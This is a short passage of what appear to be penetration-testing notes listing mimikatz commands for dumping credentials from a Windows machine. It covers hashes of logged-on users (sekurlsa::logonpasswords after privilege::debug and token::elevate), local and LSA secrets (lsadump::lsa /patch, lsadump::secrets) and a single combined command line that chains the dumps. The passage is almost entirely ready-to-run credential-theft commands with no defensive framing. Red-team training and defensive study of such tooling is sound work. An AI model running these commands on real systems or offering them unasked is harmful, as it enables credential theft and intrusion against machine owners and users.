> Here we can dump the hashes for logged on users:

```
privilege::debug (look for "20" OK)
token::elevate (if in rdp session)
sekurlsa::logonpasswords
```

> We can also obtain the hashes of local users on the machine and authenticated users:

```
lsadump::lsa /patch
```

> We can also obtain the machine hash and other passwords that may be available:

```
lsadump::secrets 
```

> If mimikatz does not work properly or produces a large duplicate output you can provide the commands you want to run in one command as seen below for example: 

```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```
